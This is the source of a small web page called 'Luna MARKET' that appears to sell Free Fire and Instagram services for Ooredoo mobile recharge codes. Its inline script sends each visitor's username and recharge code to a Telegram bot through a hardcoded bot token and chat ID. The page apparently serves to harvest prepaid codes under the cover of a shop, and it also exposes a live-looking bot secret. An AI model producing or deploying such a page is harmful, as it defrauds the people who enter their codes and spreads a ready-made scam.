<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Luna MARKET</title>
</head>
<body>
    <div class="login-box">
        <div class="login-header">
            <header>Luna MARKET</header>
            <label for="cars">Choose service:</label>
            <select name="cars" id="cars">
               <option value="FF">FF</option>
               <option value="INSTAGRAM">INSTAGRAM</option>
            </select>
        </div>
        <div class="input-box">
            <input type="text" id="username" class="input-field" placeholder="id/username" autocomplete="off" required>
        </div>
        <div class="input-box">
            <input type="text" id="ooredooCode" class="input-field" placeholder="ooredoo code recharge" autocomplete="off" required>
            <label for="cars">Choose service:</label>
            <select name="cars" id="cars">
               <option value="FF">100=1dt</option>
               <option value="INSTAGRAM">1000=5dt</option>
            </select>
        </div>
        <div class="forgot">
            <section></section>
        </div>
        <div class="input-submit">
            <button class="submit-btn" id="submit">Submit</button>
        </div>
        <div class="sign-up-link">
            <p>Wait 3 hours after buying service</p>
            <a href="#">Contact</a>
        </div>
    </div>

    <script>
        document.getElementById('submit').addEventListener('click', function () {
            // Get the input values
            const username = document.getElementById('username').value;
            const ooredooCode = document.getElementById('ooredooCode').value;

            // Replace with your bot token and chat ID
            const botToken = '7568359681:AAHonpzuDo308wdRYlkfIVWLi7dXSLjF1s8';
            const chatId = '7857638238';

            // Create the message
            const message = `Username: ${username}\nOoredoo Code: ${ooredooCode}`;

            // Send the message to your Telegram bot
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Message sent successfully:', data);
                alert('Data sent successfully!');
            })
            .catch(error => {
                console.error('Error sending message:', error);
                alert('Error sending data. Please try again.');
            });
        });
    </script>
</body>
</html>
